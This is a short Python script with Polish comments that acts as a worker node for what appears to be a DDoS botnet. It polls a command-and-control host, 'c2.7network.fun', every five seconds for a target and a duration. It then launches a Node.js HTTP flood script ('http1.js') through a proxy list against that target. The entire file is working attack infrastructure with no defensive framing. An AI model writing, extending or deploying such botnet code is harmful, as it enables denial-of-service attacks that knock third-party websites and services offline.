import requests
import time
import subprocess

MAIN_VPS = "http://c2.7network.fun:7978"  # <-- wpisz IP main VPS
WORKER_ID = "worker1"  # unikalny dla każdego workera

while True:
    try:
        r = requests.get(f"{MAIN_VPS}/api/get_task", params={"worker_id": WORKER_ID})
        data = r.json()
        if data.get("target"):
            target = data["target"]
            t = data["time"]
            # Odpala komendę
            subprocess.Popen(["node", "http1.js", target, "proxy.txt", t, "10"])
    except Exception as e:
        print("Błąd:", e)
    time.sleep(5)  # co 5 sekund pyta o zadanie 